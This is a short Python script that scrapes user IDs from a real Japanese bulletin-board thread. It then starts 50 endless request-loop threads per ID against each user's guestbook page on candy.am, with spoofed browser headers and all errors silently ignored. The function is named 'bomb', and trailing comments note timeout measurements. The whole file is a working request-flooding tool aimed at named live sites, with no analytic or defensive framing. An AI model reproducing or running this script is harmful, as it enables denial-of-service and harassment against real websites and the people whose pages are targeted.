#!/usr/bin/env python

import requests
import re
import threading

def bomb(id):
	candy_url = 'http://candy.am/' + id + '/guestbook'
	headers = {'User-Agent': 'Mozilla/5.0 iPhone OS 9_2 Safari' , "Referer": 'http://candy.am'}
	requests.get(candy_url, headers=headers)

def forever(id):
	while True:
		try:
			bomb(id)
		except:
			pass


if __name__ == "__main__":
	url = 'https://jbbs.shitaraba.net/bbs/read.cgi/internet/24622/1522583908/'

	res = re.sub(' *<','<',re.sub('> *','>',requests.get(url).text.replace('\n',' ').replace('\t',' '))).split('</dd>')[-2].split('<dd>')[-1].split('<br>')
	res.pop()
	res.pop()

	for i in range(len(res)):
		res[i] = res[i].split(' ')[0]

	thureads = []

	for i in res:
		for j in range(50):
			thureads.append(threading.Thread(target=forever, args=(i,)))
	
	for i in thureads:
		i.start()

# 1[days] = 1440[minutes]
# 100[count] 300000    ms timeout
#  50[count] 276052.15 ms
